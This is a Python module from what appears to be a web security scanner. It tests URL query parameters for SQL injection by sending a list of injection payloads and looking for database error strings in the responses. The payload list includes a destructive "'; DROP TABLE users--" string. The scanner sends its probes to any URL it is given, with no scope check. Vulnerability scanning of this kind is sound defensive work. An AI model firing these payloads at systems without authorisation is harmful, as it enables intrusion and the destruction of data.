import requests
from urllib.parse import urlparse, parse_qs, urlencode
from config import DEFAULT_TIMEOUT

SQLI_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR 'x'='x",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1 AND 1=1",
    "1 AND 1=2",
    "'; DROP TABLE users--",
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query",
    "sqlite3",
    "ora-01756",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "supplied argument is not a valid mysql",
    "mysql_fetch_array",
]


def scan_sqli(url: str) -> list:
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        params = {"id": ["1"], "page": ["1"]}

    session = requests.Session()
    session.headers["User-Agent"] = "OPTISEC-ReconPro/1.0 (Security Testing)"

    for param in params:
        for payload in SQLI_PAYLOADS:
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param] = payload
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
            try:
                r = session.get(test_url, timeout=DEFAULT_TIMEOUT, allow_redirects=True)
                body = r.text.lower()
                for err in SQL_ERRORS:
                    if err in body:
                        findings.append({
                            "type": "SQL Injection",
                            "severity": "Critical",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": f"SQL error detected: '{err}'",
                        })
                        break
            except Exception:
                continue

    return findings
